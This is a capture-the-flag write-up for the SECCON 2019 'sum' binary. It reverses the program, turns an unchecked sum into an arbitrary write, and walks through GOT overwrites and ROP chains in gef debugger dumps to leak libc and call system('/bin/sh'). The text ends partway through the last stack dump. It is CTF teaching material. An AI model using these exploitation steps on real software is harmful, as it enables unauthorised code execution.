# Seccon 2019 Quals Sum

Let's take a look at the binary and libc:

```
$    file sum_ccafa40ee6a5a675341787636292bf3c84d17264
sum_ccafa40ee6a5a675341787636292bf3c84d17264: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=593a57775caa3028bd2ab72873bedaa36734cdb6, not stripped
$    pwn checksec sum_ccafa40ee6a5a675341787636292bf3c84d17264
[*] '/home/guyinatuxedo/Desktop/seccon/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./libc.so
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.3.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./sum_ccafa40ee6a5a675341787636292bf3c84d17264
[sum system]
Input numbers except for 0.
0 is interpreted as the end of sequence.

[Example]
2 3 4 0
1
5
0
6
$    ./sum_ccafa40ee6a5a675341787636292bf3c84d17264
[sum system]
Input numbers except for 0.
0 is interpreted as the end of sequence.

[Example]
2 3 4 0
1
5
6
9
8
7
Segmentation fault (core dumped)
```

So we can see that it is a `64` bit elf, with a stack canary, and non-executable stack. The binary appears to add numbers together. We input the numbers one at a time, and a `0` will end the sequence. If we input 6 digits, it crashes. Let's take a look under the hood.

## Reversing

When we take a look at the `main` function in ghidra, we see this:

```
undefined8 main(void)

{
  ulong uVar1;
  long in_FS_OFFSET;
  undefined8 ints;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  long *amnt;
  long local_18;
  long local_10;
 
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  ints = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_18 = 0;
  amnt = &local_18;
  puts("[sum system]\nInput numbers except for 0.\n0 is interpreted as the end of sequence.\n");
  puts("[Example]\n2 3 4 0");
  read_ints((long)&ints,5);
  uVar1 = sum((long)&ints,amnt);
  if (5 < (int)uVar1) {
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  printf("%llu\n",local_18);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

When we look at the main function, we see that it first establishes an int array `ints`, that can hold 6 integers. The sixth integer in this array is `amnt`, which is a pointer to the next integer on the stack, `local_18`. First it prints out some text, then calls `read_ints`:

```
void read_ints(long ints,long amnt)

{
  int scanfCheck;
  long in_FS_OFFSET;
  long i;
  long stackCanary;
 
  stackCanary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0;
  while (i <= amnt) {
    scanfCheck = __isoc99_scanf(&DAT_00400a68,ints + i * 8,i * 8);
    if (scanfCheck != 1) {
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    if (*(long *)(ints + i * 8) == 0) break;
    i = i + 1;
  }
  if (stackCanary == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

So here we can see it will scan in integers into the array passed by it's first argument, until it either gets a `0` or it scans in `amnt` + 1 integers. Under the context it is called, it will scan in a maximum of `6` integers into the `ints` array. Proceeding that it calls `sum`, with the arguments being the `ints` array and `amnt`:

```
ulong sum(long ints,long *x)

{
  long in_FS_OFFSET;
  uint i;
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  *x = 0;
  i = 0;
  while (*(long *)(ints + (long)(int)i * 8) != 0) {
    *x = *(long *)(ints + (long)(int)i * 8) + *x;
    i = i + 1;
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return (ulong)i;
}
```

So we can see that it adds up all of the values in `ints`, and stores them in `x`. In the context that it is called, it will add up the six (or less) values stored in `ints`, and store it in `amnt`. In addition to that, there is an integer overflow bug here, since it doesn't check if the values it is adding together will cause an overflow. Since we control `amnt`, we effectively have a write what where. The value returned is the number of numbers it added together. Looking at the rest of the main function, we see that if we gave it six numbers (thus causing the write what where bug), it will call `exit`. If not it will call `printf` and return from main.

## Exploitation

So we have a write what where, with no relro or pie. The first problem is that right after our write, it will call `exit`. This can be solved by just overwriting the got address of `exit` (`0x601048`) with the start of `main` (`0x400903`). That way when it calls `exit`, it will just put us back at the start of `main`. This will give us a loop where we get multiple qword writes.

Now the next hurdle is getting a libc infoleak. At this point, one of my team-mates mksrg gave me the idea to do a stack pivot. When we take a look at the stack layout when `printf` is called (`exit` will also have this), we see something interesting:

```
gef➤  b *0x4009bf
Breakpoint 1 at 0x4009bf
gef➤  r
Starting program: /home/guyinatuxedo/Desktop/sum/sum_ccafa40ee6a5a675341787636292bf3c84d17264
[sum system]
Input numbers except for 0.
0 is interpreted as the end of sequence.

[Example]
2 3 4 0
159
357
951
753
0
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x20              
$rsp   : 0x00007fffffffdee0  →  0x000000000000009f
$rbp   : 0x00007fffffffdf20  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x8ac             
$rdi   : 0x0000000000400ad5  →  0x0100000a756c6c25 ("%llu"?)
$rip   : 0x00000000004009bf  →  <main+188> call 0x400620 <printf@plt>
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007ffff7b82cc0  →  0x0002000200020002
$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
$r12   : 0x0000000000400670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffe000  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdee0│+0x0000: 0x000000000000009f     ← $rsp
0x00007fffffffdee8│+0x0008: 0x0000000000000165
0x00007fffffffdef0│+0x0010: 0x00000000000003b7
0x00007fffffffdef8│+0x0018: 0x00000000000002f1
0x00007fffffffdf00│+0x0020: 0x0000000000000000
0x00007fffffffdf08│+0x0028: 0x00007fffffffdf10  →  0x00000000000008ac
0x00007fffffffdf10│+0x0030: 0x00000000000008ac
0x00007fffffffdf18│+0x0038: 0x571694db34020d00
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009af <main+172>       lock   mov rsi, rax
     0x4009b3 <main+176>       lea    rdi, [rip+0x11b]        # 0x400ad5
     0x4009ba <main+183>       mov    eax, 0x0
 →   0x4009bf <main+188>       call   0x400620 <printf@plt>
   ↳    0x400620 <printf@plt+0>   jmp    QWORD PTR [rip+0x200a02]        # 0x601028
        0x400626 <printf@plt+6>   push   0x2
        0x40062b <printf@plt+11>  jmp    0x4005f0
        0x400630 <alarm@plt+0>    jmp    QWORD PTR [rip+0x2009fa]        # 0x601030
        0x400636 <alarm@plt+6>    push   0x3
        0x40063b <alarm@plt+11>   jmp    0x4005f0
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x0000000000400ad5 → 0x0100000a756c6c25 ("%llu"?),
   $rsi = 0x00000000000008ac,
   $rdx = 0x0000000000000020,
   $rcx = 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009bf → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004009bf in main ()
gef➤  
```

So when `printf` is called, the values on the stack are the numbers that we sent to be added up. Of course, when the `call` instruction happens the return address (the instruction right after the call) will be pushed onto the stack. But after that on the stack, will be values we control. So if we were to overwrite the got address of `printf` with a rop gadget like `pop rdi; ret`, we can start roping.

To find out ROP gadget:
```
$    ROPgadget --binary sum_ccafa40ee6a5a675341787636292bf3c84d17264 | grep "pop rdi"
0x0000000000400a43 : pop rdi ; ret
```

Now for the rop chain itself, it will contain the following values:

```
0x00:    popRdi Instruction
0x08:    got address of puts
0x10:    plt address of puts
0x18:    0x4009a7 (the `exit` call, so we will loop back to main)
0x20:    "0" (to end the number sequence)
```

First off, remember that this chain is executed when `printf` is called, after we overwrite the got address of printf with `0x400a43`. Now this is just a rop chain to give us a libc infoleak by using `puts` to print the got address of `puts`. When I first tried this, I ran into some issues where what I was doing was messing with some of the internals of puts/scanf. I played around with what I was calling, and where I was jumping, and after a little bit I got something that worked. Let's see this rop gadget in action:

First we hit printf:
```
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e05900│+0x0000: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi ← $rsp
0x00007ffcc5e05908│+0x0008: 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13
0x00007ffcc5e05910│+0x0010: 0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018
0x00007ffcc5e05918│+0x0018: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>
0x00007ffcc5e05920│+0x0020: 0x0000000000000000
0x00007ffcc5e05928│+0x0028: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0030: 0x0000000001202a02
0x00007ffcc5e05938│+0x0038: 0x791fd3bfbdbc2c00
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009af <main+172>       lock   mov rsi, rax
     0x4009b3 <main+176>       lea    rdi, [rip+0x11b]        # 0x400ad5
     0x4009ba <main+183>       mov    eax, 0x0
 →   0x4009bf <main+188>       call   0x400620 <printf@plt>
   ↳    0x400620 <printf@plt+0>   jmp    QWORD PTR [rip+0x200a02]        # 0x601028
        0x400626 <printf@plt+6>   push   0x2
        0x40062b <printf@plt+11>  jmp    0x4005f0
        0x400630 <alarm@plt+0>    jmp    QWORD PTR [rip+0x2009fa]        # 0x601030
        0x400636 <alarm@plt+6>    push   0x3
        0x40063b <alarm@plt+11>   jmp    0x4005f0
─────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x0000000000400ad5 → 0x0100000a756c6c25 ("%llu"?),
   $rsi = 0x0000000001202a02,
   $rdx = 0x0000000000000020,
   $rcx = 0x0000000000000000
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009bf → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004009bf in main ()
gef➤  
```

Then we have an iteration of the `pop rdi; ret` instruction to rid ourselves of the return address pushed onto the stack by `call`:
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e058f8│+0x0000: 0x00000000004009c4  →  <main+193> mov eax, 0x0     ← $rsp
0x00007ffcc5e05900│+0x0008: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi
0x00007ffcc5e05908│+0x0010: 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13
0x00007ffcc5e05910│+0x0018: 0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018
0x00007ffcc5e05918│+0x0020: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>
0x00007ffcc5e05920│+0x0028: 0x0000000000000000
0x00007ffcc5e05928│+0x0030: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0038: 0x0000000001202a02
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x400a43 <__libc_csu_init+99> pop    rdi
     0x400a44 <__libc_csu_init+100> ret    
     0x400a45                  nop    
     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x400a50 <__libc_csu_fini+0> repz   ret
     0x400a52                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a43 → __libc_csu_init()
[#1] 0x400a43 → __libc_csu_init()
[#2] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
[#3] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a43 in __libc_csu_init ()
gef➤  
gef➤  s

Program received signal SIGALRM, Alarm clock.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x20              
$rsp   : 0x00007ffcc5e05900  →  0x0000000000400a43  →  <__libc_csu_init+99> pop rdi
$rbp   : 0x00007ffcc5e05940  →  0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x1202a02         
$rdi   : 0x00000000004009c4  →  <main+193> mov eax, 0x0
$rip   : 0x0000000000400a44  →  <__libc_csu_init+100> ret
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007fc390381cc0  →  0x0002000200020002
$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
$r12   : 0x0000000000400670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffcc5e05ac0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e05900│+0x0000: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi     ← $rsp
0x00007ffcc5e05908│+0x0008: 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13
0x00007ffcc5e05910│+0x0010: 0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018
0x00007ffcc5e05918│+0x0018: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>
0x00007ffcc5e05920│+0x0020: 0x0000000000000000
0x00007ffcc5e05928│+0x0028: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0030: 0x0000000001202a02
0x00007ffcc5e05938│+0x0038: 0x791fd3bfbdbc2c00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a3e <__libc_csu_init+94> pop    r13
     0x400a40 <__libc_csu_init+96> pop    r14
     0x400a42 <__libc_csu_init+98> pop    r15
 →   0x400a44 <__libc_csu_init+100> ret    
   ↳    0x400a43 <__libc_csu_init+99> pop    rdi
        0x400a44 <__libc_csu_init+100> ret    
        0x400a45                  nop    
        0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
        0x400a50 <__libc_csu_fini+0> repz   ret
        0x400a52                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a44 → __libc_csu_init()
[#1] 0x400a43 → __libc_csu_init()
[#2] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
[#3] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a44 in __libc_csu_init ()
gef➤  s
```

Next we execute the infoleak by popping the got address of puts into the rdi register:
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e05908│+0x0000: 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13     ← $rsp
0x00007ffcc5e05910│+0x0008: 0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018
0x00007ffcc5e05918│+0x0010: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>
0x00007ffcc5e05920│+0x0018: 0x0000000000000000
0x00007ffcc5e05928│+0x0020: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0028: 0x0000000001202a02
0x00007ffcc5e05938│+0x0030: 0x791fd3bfbdbc2c00
0x00007ffcc5e05940│+0x0038: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15     ← $rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
 →   0x400a43 <__libc_csu_init+99> pop    rdi
     0x400a44 <__libc_csu_init+100> ret    
     0x400a45                  nop    
     0x400a46                  nop    WORD PTR cs:[rax+rax*1+0x0]
     0x400a50 <__libc_csu_fini+0> repz   ret
     0x400a52                  add    BYTE PTR [rax], al
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a43 → __libc_csu_init()
[#1] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
[#2] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a43 in __libc_csu_init ()
gef➤  s
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x0               
$rdx   : 0x20              
$rsp   : 0x00007ffcc5e05910  →  0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018
$rbp   : 0x00007ffcc5e05940  →  0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15
$rsi   : 0x1202a02         
$rdi   : 0x0000000000601018  →  0x00007fc3902639c0  →  <puts+0> push r13
$rip   : 0x0000000000400a44  →  <__libc_csu_init+100> ret
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x00007fc390381cc0  →  0x0002000200020002
$r11   : 0x0000000000400a6c  →   add BYTE PTR [rax], al
$r12   : 0x0000000000400670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007ffcc5e05ac0  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero CARRY PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e05910│+0x0000: 0x0000000000400600  →  <puts@plt+0> jmp QWORD PTR [rip+0x200a12]        # 0x601018     ← $rsp
0x00007ffcc5e05918│+0x0008: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>
0x00007ffcc5e05920│+0x0010: 0x0000000000000000
0x00007ffcc5e05928│+0x0018: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0020: 0x0000000001202a02
0x00007ffcc5e05938│+0x0028: 0x791fd3bfbdbc2c00
0x00007ffcc5e05940│+0x0030: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15     ← $rbp
0x00007ffcc5e05948│+0x0038: 0x00000000004009ac  →  <main+169> mov rax, QWORD PTR [rbp-0x10]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400a3e <__libc_csu_init+94> pop    r13
     0x400a40 <__libc_csu_init+96> pop    r14
     0x400a42 <__libc_csu_init+98> pop    r15
 →   0x400a44 <__libc_csu_init+100> ret    
   ↳    0x400600 <puts@plt+0>     jmp    QWORD PTR [rip+0x200a12]        # 0x601018
        0x400606 <puts@plt+6>     push   0x0
        0x40060b <puts@plt+11>    jmp    0x4005f0
        0x400610 <__stack_chk_fail@plt+0> jmp    QWORD PTR [rip+0x200a0a]        # 0x601020
        0x400616 <__stack_chk_fail@plt+6> push   0x1
        0x40061b <__stack_chk_fail@plt+11> jmp    0x4005f0
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400a44 → __libc_csu_init()
[#1] 0x400600 → jmp QWORD PTR [rip+0x200a12]        # 0x601018
[#2] 0x7ffcc5e05930 → add ch, BYTE PTR [rdx]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x0000000000400a44 in __libc_csu_init ()
gef➤  x/g $rdi
0x601018:    0x7fc3902639c0
gef➤  x/5i 0x7fc3902639c0
   0x7fc3902639c0 <puts>:    push   r13
   0x7fc3902639c2 <puts+2>:    push   r12
   0x7fc3902639c4 <puts+4>:    mov    r12,rdi
   0x7fc3902639c7 <puts+7>:    push   rbp
   0x7fc3902639c8 <puts+8>:    push   rbx
```

after that we call `printf`:
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e05918│+0x0000: 0x00000000004009a7  →  <main+164> call 0x400660 <exit@plt>     ← $rsp
0x00007ffcc5e05920│+0x0008: 0x0000000000000000
0x00007ffcc5e05928│+0x0010: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0018: 0x0000000001202a02
0x00007ffcc5e05938│+0x0020: 0x791fd3bfbdbc2c00
0x00007ffcc5e05940│+0x0028: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15     ← $rbp
0x00007ffcc5e05948│+0x0030: 0x00000000004009ac  →  <main+169> mov rax, QWORD PTR [rbp-0x10]
0x00007ffcc5e05950│+0x0038: 0x7fffffffffffffff
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fc3902639b2 <popen+130>      jmp    0x7fc39026398d <popen+93>
   0x7fc3902639b4                  nop    WORD PTR cs:[rax+rax*1+0x0]
   0x7fc3902639be                  xchg   ax, ax
 → 0x7fc3902639c0 <puts+0>         push   r13
   0x7fc3902639c2 <puts+2>         push   r12
   0x7fc3902639c4 <puts+4>         mov    r12, rdi
   0x7fc3902639c7 <puts+7>         push   rbp
   0x7fc3902639c8 <puts+8>         push   rbx
   0x7fc3902639c9 <puts+9>         sub    rsp, 0x8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7fc3902639c0 → puts()
[#1] 0x4009a7 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x00007fc3902639c0 in puts () from ./libc.so
gef➤  finish
```

Then we end up at `exit`, which will bring us back to the start of `main`:
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffcc5e05920│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffcc5e05928│+0x0008: 0x00007ffcc5e05930  →  0x0000000001202a02
0x00007ffcc5e05930│+0x0010: 0x0000000001202a02
0x00007ffcc5e05938│+0x0018: 0x791fd3bfbdbc2c00
0x00007ffcc5e05940│+0x0020: 0x00007ffcc5e05990  →  0x00007ffcc5e059e0  →  0x00000000004009e0  →  <__libc_csu_init+0> push r15     ← $rbp
0x00007ffcc5e05948│+0x0028: 0x00000000004009ac  →  <main+169> mov rax, QWORD PTR [rbp-0x10]
0x00007ffcc5e05950│+0x0030: 0x7fffffffffffffff
0x00007ffcc5e05958│+0x0038: 0x7fffffffff9fefd7
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40099b <main+152>       (bad)  
     0x40099c <main+153>       inc    DWORD PTR [rbx+0xa7e05f8]
     0x4009a2 <main+159>       mov    edi, 0xffffffff
 →   0x4009a7 <main+164>       call   0x400660 <exit@plt>
   ↳    0x400660 <exit@plt+0>     jmp    QWORD PTR [rip+0x2009e2]        # 0x601048
        0x400666 <exit@plt+6>     push   0x6
        0x40066b <exit@plt+11>    jmp    0x4005f0
        0x400670 <_start+0>       xor    ebp, ebp
        0x400672 <_start+2>       mov    r9, rdx
        0x400675 <_start+5>       pop    rsi
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
exit@plt (
   $rdi = 0x0000000000000001,
   $rsi = 0x00007fc3905cf7e3 → 0x5d08c0000000000a,
   $rdx = 0x00007fc3905d08c0 → 0x0000000000000000,
   $rcx = 0x00007fc3902f3154 → 0x5477fffff0003d48 ("H="?)
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009a7 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 2, 0x00000000004009a7 in main ()
gef➤  
```

So now we have a libc infoleak, and a qword write. This is all we need to pwn the code. I initially tried doing a oneshot gadget got overwrite, however none of the conditions were met when it was executed. Then I just did another rop gadget using `printf` again, to just pop the libc address of `/bin/sh` (which we know thanks to the libc infoleak) into the `rdi` register, and then return to system. Let's see the rop chain in action:

First we hit `printf` again:
```
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffd12150f20│+0x0000: 0x0000000000400a43  →  <__libc_csu_init+99> pop rdi ← $rsp
0x00007ffd12150f28│+0x0008: 0x00007fab33599e9a  →  0x0068732f6e69622f ("/bin/sh"?)
0x00007ffd12150f30│+0x0010: 0x00007fab33435440  →  <system+0> test rdi, rdi
0x00007ffd12150f38│+0x0018: 0x0000000000000000
0x00007ffd12150f40│+0x0020: 0x0000000000000000
0x00007ffd12150f48│+0x0028: 0x00007ffd12150f50  →  0x0000ff5666dcfd1d
0x00007ffd12150f50│+0x0030: 0x0000ff5666dcfd1d
0x00007ffd12150f58│+0x0038: 0xc21062d171a89f00
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009af <main+172>       lock   mov rsi, rax
     0x4009b3 <main+176>       lea    rdi, [rip+0x11b]        # 0x400ad5
     0x4009ba <main+183>       mov    eax, 0x0
 →   0x4009bf <main+188>       call   0x400620 <printf@plt>
   ↳    0x400620 <printf@plt+0>   jmp    QWORD PTR [rip+0x200a02]        # 0x601028
        0x400626 <printf@plt+6>   push   0x2
        0x40062b <printf@plt+11>  jmp    0x4005f0
        0x400630 <alarm@plt+0>    jmp    QWORD PTR [rip+0x2009fa]        # 0x601030
        0x400636 <alarm@plt+6>    push   0x3
        0x40063b <alarm@plt+11>   jmp    0x4005f0
─────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   $rdi = 0x0000000000400ad5 → 0x0100000a756c6c25 ("%llu"?),
   $rsi = 0x0000ff5666dcfd1d,
   $rdx = 0x0000000000000018,
   $rcx = 0x0000000000000000
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "sum_ccafa40ee6a", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009bf → main()
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x00000000004009bf in main ()
gef➤  
```

Then we have the `pop rdi; ret` to rid ourselves of the return address:
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd12150f18│+0x0000: 0x00000000004009c4  →  <main+193> mov eax, 0x0     ← $rsp
